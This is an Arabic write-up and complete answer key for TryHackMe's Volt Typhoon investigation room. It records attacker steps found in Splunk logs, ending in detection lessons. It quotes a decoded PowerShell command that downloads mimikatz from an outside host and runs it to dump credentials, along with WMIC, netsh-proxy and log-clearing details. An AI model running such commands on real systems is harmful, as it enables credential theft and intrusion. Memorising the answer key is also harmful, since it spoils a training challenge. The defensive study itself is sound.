# Volt Typhoon — TryHackMe

> **الحالة:** مكتملة رسمياً — Room completed! تم إدخال جميع الإجابات والتحقق منها داخل TryHackMe بحالة Correct Answer لكل سؤال، ثم ظهرت صفحة الإكمال الرسمية للغرفة. المهام المكتملة: 9، النقاط: 450. رابط صفحة الإكمال: https://tryhackme.com/room/volttyphoon/congratulations?step=records. لم يُرسل تقييم الغرفة.

## بطاقة الغرفة

| الحقل | القيمة |
|---|---|
| الرابط | https://tryhackme.com/room/volttyphoon |
| التصنيف/المجال | SOC Level 2 → SOC Level 2 Capstone Challenges |
| الصعوبة | غير مذكورة |
| المختبر | Volt Typhoon v6-badr — 10.49.128.168 |

## الملخص التنفيذي

يغطي هذا المختبر سلسلة هجوم منسوبة لنمط Volt Typhoon، تبدأ من الوصول الأولي عبر سجلات Zoho ManageEngine ADSelfService Plus، ثم تنفيذ أوامر عبر WMIC ونسخ قاعدة بيانات Active Directory، فإرساء الاستمرارية عبر web shell. تبِع ذلك محاولات مراوغة دفاعية عبر حذف آثار RDP وإعادة تسمية أرشيف قاعدة البيانات، وفحص مؤشرات البيئة الافتراضية، والبحث عن بيانات اعتماد، ثم حركة أفقية ونسخ web shell إلى خادم آخر. في المرحلة الختامية، جُمعت ملفات مالية، وأُنشئ proxy لقناة C2، ومُسحت سجلات أحداث Windows.[1] [2]

تعكس الأنشطة اعتماد المهاجم على أدوات Windows المدمجة بأسلوب Living off the Land، بما يتوافق مع توثيق عمليات Volt Typhoon التي تستخدم PowerShell وWMIC وntdsutil وnetsh.[3]

## مسار الحل

### 1. بيئة المختبر والوصول للبيانات

- الوصول إلى Splunk عبر: http://10.49.128.168:8000
- بيانات الدخول التدريبية: اسم المستخدم volthunter وكلمة المرور voltyp1010
- الاعتماد على مصادر سجلات الغرفة وتحليل الحقول لاستخراج توقيتات الأحداث والأوامر والمسارات ذات الصلة، مع التحقق من كل إجابة عبر Check في واجهة TryHackMe.

### 2. Initial Access

- تحديد وقت تغيير كلمة مرور حساب Dean بصيغة ISO 8601: 2024-03-24T11:10:22
- رصد إنشاء حساب إداري جديد باسم: voltyp-admin

### 3. Execution

- تنفيذ جمع معلومات الأقراص عن server01 وserver02 عبر WMIC:
```
wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename
```
- كلمة مرور أرشيف نسخة قاعدة Active Directory: d5ag0nm@5t3r

### 4. Persistence

- مكان زرع الـ web shell: C:\Windows\Temp\

### 5. Defense Evasion

- حذف سجل Most Recently Used عبر PowerShell cmdlet:
```
Remove-ItemProperty
```
- إعادة تسمية ملف الأرشفة وتغيير الامتداد إلى: cl64.gif
- فحص البيئة الافتراضية عبر مسار Registry: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control

### 6. Credential Access

- فحص برامج عبر reg query لاستخراج بيانات اعتماد: OpenSSH, putty, realvnc
- تنزيل وتشغيل Mimikatz بالأمر المفكوك التالي:
```
Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait
```

### 7. Discovery & Lateral Movement

- البحث في سجلات الأحداث بواسطة wevtutil عن Event IDs: 4624 4625 4769
- اسم الـ web shell الجديد على server-02: AuditReport.jspx

### 8. Collection

- الملفات المالية التي جُمعت: 2022.csv 2023.csv 2024.csv

### 9. C2 & Cleanup

- إعداد قناة proxy نحو 10.2.30.1:8443 باستخدام netsh
- مسح أنواع سجلات Windows Events التالية: Application Security Setup System

## الإجابات النهائية

| المهمة/السؤال | الإجابة المقبولة |
|---|---|
| Task 1 — IR Scenario: تأكيد المسؤوليات وبدء المختبر | لا توجد إجابة مطلوبة؛ يُترك الحقل فارغاً |
| Task 2 — Initial Access 1: وقت تغيير كلمة مرور Dean بصيغة ISO 8601 | 2024-03-24T11:10:22 |
| Task 2 — Initial Access 2: اسم الحساب الإداري الجديد | voltyp-admin |
| Task 3 — Execution 1: أمر WMIC لجمع معلومات الأقراص من server01 وserver02 | wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename |
| Task 3 — Execution 2: كلمة مرور أرشيف نسخة قاعدة AD | d5ag0nm@5t3r |
| Task 4 — Persistence: مجلد وضع web shell | C:\Windows\Temp\ |
| Task 5 — Defense Evasion 1: PowerShell cmdlet لحذف سجل Most Recently Used | Remove-ItemProperty |
| Task 5 — Defense Evasion 2: اسم الملف بعد إعادة تسمية الأرشيف وتغيير امتداده | cl64.gif |
| Task 5 — Defense Evasion 3: مسار Registry لفحص البيئة الافتراضية | HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control |
| Task 6 — Credential Access 1: البرامج الثلاثة التي فحصها المهاجم بوساطة reg query | OpenSSH, putty, realvnc |
| Task 6 — Credential Access 2: الأمر الكامل المفكوك لتنزيل وتشغيل Mimikatz | Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait |
| Task 7 — Discovery & Lateral Movement 1: Event IDs التي بحث عنها المهاجم باستخدام wevtutil | 4624 4625 4769 |
| Task 7 — Discovery & Lateral Movement 2: اسم web shell الجديد على server-02 | AuditReport.jspx |
| Task 8 — Collection: الملفات المالية الثلاثة المنسوخة | 2022.csv 2023.csv 2024.csv |
| Task 9 — C2 & Cleanup 1: عنوان الاتصال والمنفذ في proxy | 10.2.30.1 8443 |
| Task 9 — C2 & Cleanup 2: أنواع سجلات الأحداث التي مسحها المهاجم | Application Security Setup System |

## التحقق الرسمي داخل TryHackMe

- لكل إجابة مُدخلة ظهرت عبارة Correct Answer في واجهة المنصة.
- عند اكتمال الإجابات، ظهرت صفحة الإكمال الرسمية للغرفة بحالة Room completed! مع إحصاءات: Completed tasks: 9 وPoints earned: 450.
- رابط صفحة الإكمال المعروض: https://tryhackme.com/room/volttyphoon/congratulations?step=records
- تم قبول الإجابات بالكامل داخل المنصة؛ لا يتضمن هذا التحقق إرسال تقييم منفصل.

## الدروس الأمنية

- توضح السلسلة كيف يُستغل أسلوب Living off the Land عبر أدوات أصلية مثل PowerShell وWMIC وnetsh لتنفيذ مراحل الهجوم دون إسقاط أدوات كثيرة. المراقبة الفعالة يجب أن تُركز على أوامر النظام المزدوجة الاستخدام، وتغييرات Registry الحساسة، ومحاولات تفريغ/مسح سجلات الأحداث، وأنماط إنشاء حسابات إدارية غير اعتيادية. كما أن تتبع نشاط ملفات web shell وأرشفة/نقل بيانات AD والاتصالات الوكيلة نحو عناوين غير مألوفة يعد ضرورياً لاكتشاف النشاط مبكراً واحتوائه.[1] [3]

## المراجع

[1]: https://tryhackme.com/room/volttyphoon "TryHackMe — Volt Typhoon"
[2]: https://github.com/Paulus1337/Volt-Typhoon-Write-up "Paulus1337 — Volt Typhoon Write-up"
[3]: https://attack.mitre.org/groups/G1017/ "MITRE ATT&CK — Volt Typhoon (G1017)"
